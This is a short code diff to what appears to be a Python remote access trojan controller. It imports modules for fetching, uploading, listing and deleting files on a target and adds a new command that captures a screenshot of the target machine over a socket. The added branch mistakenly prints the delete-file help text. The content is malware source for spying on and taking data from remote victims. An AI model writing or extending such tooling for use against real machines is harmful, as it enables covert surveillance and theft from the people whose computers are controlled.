@@ -8,6 +8,7 @@ from RAT_Py_GetFile import *
 from RAT_Py_PutFile import *
 from RAT_Py_DirList import * 
 from RAT_Py_DeleteFile import *
+from RAT_Py_Screenshot import * 
 #from scapy.all import * # switch from socket to scapy for custom TCP packets
 
 SUCCESS = 1
@@ -153,6 +154,17 @@ def handleInput(ip, port):
             filePath = bytes(args.filepath, 'utf-8')
 
             deleteFile(sock, filePath)
+
+        elif(int(userInput) == SCREENSHOT):
+            printDeleteFileHelp()
+            user_input = input("> ")
+            parser = argparse.ArgumentParser(description='Perform a screenshot of target')
+            parser.add_argument('-filepath', '--filepath', type=str, help='Path where we would like to write our screenshot to locally', action='store', required=True)
+            args = parser.parse_args(user_input.split())
+            
+            filePath = args.filepath
+
+            screenshot(sock, filePath)
 
     return
 
